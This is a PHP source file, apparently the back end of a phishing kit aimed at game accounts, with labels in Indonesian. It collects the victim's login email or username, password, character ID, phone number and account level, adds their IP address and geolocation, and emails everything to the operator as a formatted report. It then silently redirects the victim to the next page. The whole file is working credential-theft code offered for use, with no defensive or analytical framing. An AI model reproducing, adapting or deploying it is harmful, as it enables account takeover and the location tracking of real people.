<?php
include 'system/setting.php';
include 'system/geolocation.php';
include 'system/get_callingcode.php';
include 'system/get_flag.php';
include 'email.php';

$true = new playid();
$email = $true->post($_POST['email']);
$password = $true->post($_POST['password']);
$playid = $true->post($_POST['playid']);
$phone = $true->post($_POST['phone']);
$level = $true->post($_POST['level']);
$login = $true->post($_POST['login']);

$callingcode = $gungrate_callingcode['country_code'];

if($email == "" && $password == "" && $playid == "" && $nick == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $login == ""){
header("Location: index.php");
}else{

$subjek = " $gungrate_flag | +$callingcode | LEVEL $level | PUNYA SI $email | LOGIN $login";
$pesan = '
<center> 
<div style="background: url(https://i.ibb.co/684pxgr/gungrate-store.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 80px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width:78%;text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>PASSWORD</th>
<th style="width:78%;text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>CHARACTER ID</th>
<th style="width:78%;text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>PHONE NUMBER</th>
<th style="width:78%;text-align: center;"><b>'.$phone.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="width:78%;text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>LOGIN</th>
<th style="width:78%;text-align:center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>BENUA</th>
<th style="width: 78%; text-align: center;"><b>'.$gungrate['continent'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$gungrate['country'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CALLING CODE</th>
<th style="width: 78%; text-align: center;"><b>+'.$callingcode.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$gungrate['region'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$gungrate['city'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$gungrate['lat'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$gungrate['lon'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>'.$gungrate['query'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya :
</div>
<div style="float: right;">
<a href="https://t.me/gungrateCH"><img style="margin: 5px;" width="30" src="https://i.ibb.co/DKyHYYs/Logo-G-GUNGRATE-PNG.png"></a>
<a href="https://facebook.com/gungratee/"><img style="margin: 5px;" width="30" src="https://i.ibb.co/SxcV8wB/facebook.png"></a>
<a href="https://t.me/gungrate"><img style="margin: 5px;" width="30" src="https://i.ibb.co/Ph7nCjg/telegram.png"></a>
</div>
</div>
</center>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$true->mail($emailku, $subjek, $pesan, $headers);

echo "<form id='gungrate' method='POST' action='processing.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('gungrate').submit();</script>";
}
?>